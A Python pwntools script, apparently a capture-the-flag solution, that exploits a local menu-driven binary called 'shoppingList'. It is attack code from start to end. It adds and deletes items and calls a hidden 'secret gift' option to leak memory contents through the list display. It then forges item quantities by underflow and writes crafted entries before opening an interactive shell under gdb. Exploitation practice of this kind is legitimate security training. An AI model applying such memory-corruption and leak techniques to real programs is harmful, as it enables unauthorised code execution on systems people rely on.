from pwn import *
import re

from utils import items


while True:
    p = process("../src/shoppingList")
    p.recvuntil(b"Welcome to ptmList")

    n_list_element = 0

    f = open("./input.bin", "wb")

    def add_item(i, q):
        global n_list_element
        n_list_element += 1

        payload = b"\n"
        payload += b"s" * i
        payload += b"\n"
        payload += b"s" * q
        payload += b"\n\x1b"
        f.write(payload)
        p.send(payload)
        p.recvuntil(b"Welcome to ptmList")

    def show_list():
        payload = b"s\n" + b"s" * n_list_element + b"\x1b"
        f.write(payload)
        p.send(payload)
        p.recvuntil(b"Welcome to ptmList")
        my_list = p.recvuntil(b"Welcome to ptmList")
        return my_list

    def secret_gift(i):
        payload = b"ss\n" + b"s" * i + b"\n"
        f.write(payload)
        p.send(payload)
        p.recvuntil(b"Welcome to ptmList")
        p.recvuntil(b"Welcome to ptmList")
        p.recvuntil(b"Welcome to ptmList")

    def delete_item(i, q):
        payload = b"s\n" + b"s" * i + b"ds" + b"s" * q + b"\n\x1b"
        f.write(payload)
        p.send(payload)
        p.recvuntil(b"Welcome to ptmList")
        print(p.recvuntil(b"Welcome to ptmList"))

    for _ in range(3):
        add_item(42, 1)

    secret_gift(2)
    my_list=show_list()
    print(my_list)
    delete_item(1, 0)
    delete_item(0, 0)
    my_list = show_list()
    print(my_list)
    m = re.findall(
        b"([\w ]+)\| Quantity: (\d+)",
        my_list,
    )
    
    l = list(m)
    i = l[::-1].index((b" pair of dice                  ", b"1"))
    l = l[-i + 1 :]
    print(l)
    break
    data = b""

    for x in l:
        i = items.index(x[0].decode().strip())
        data += bytes([i])

    print(data)

    c = 0
    for e in l:
        if int(e[1].decode()) > 99:
            c += 1

    if c > 1:
        p.kill()
        continue

    gdb.attach(p)

    add_item(0, 1)

    for i in range(4):
        item_i = items.index(l[i][0].decode().strip())
        q = int(l[i][1].decode())

        if q <= 99:
            add_item(item_i, q)
        else:
            add_item(item_i, 1)
            secret_gift(n_list_element - 1)
            delete_item(n_list_element - 1, 255 - q)

    for _ in range(4):
        add_item(3, 3)

    for _ in range(4):
        add_item(0x42, 0x42)

    p.interactive()
    break
